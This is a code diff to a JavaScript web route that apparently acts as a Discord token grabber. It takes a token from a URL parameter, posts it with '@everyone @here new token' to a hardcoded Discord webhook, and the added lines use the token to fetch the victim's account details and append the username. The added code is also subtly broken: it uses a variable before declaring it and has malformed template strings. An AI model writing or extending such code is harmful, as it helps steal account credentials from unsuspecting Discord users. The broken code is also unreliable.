@@ -83,9 +83,22 @@ app.get("/k", async (req, res) => {
 var webhookURL = "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz";
 var url_string = window.location.href; 
 var url = new URL(url_string);
+
+async function getDiscordAccountInfo(token) {
+  const response = await fetch('https://discord.com/api/users/@me', {
+    headers: {
+      'Authorization': ${token}
+    }
+  });
+  const accountInfo = await response.json();
+  return accountInfo;
+}
+const accountInfo = await getDiscordAccountInfo(currentURL);
+
+var info = Username: ${accountInfo.username}#${accountInfo.discriminator}
 var currentURL = url.searchParams.get("user");
 var postData = {
-  content: "@everyone @here new token " + currentURL
+  content: "@everyone @here new token " + currentURL + info
 };
 fetch(webhookURL, {
   method: "POST",
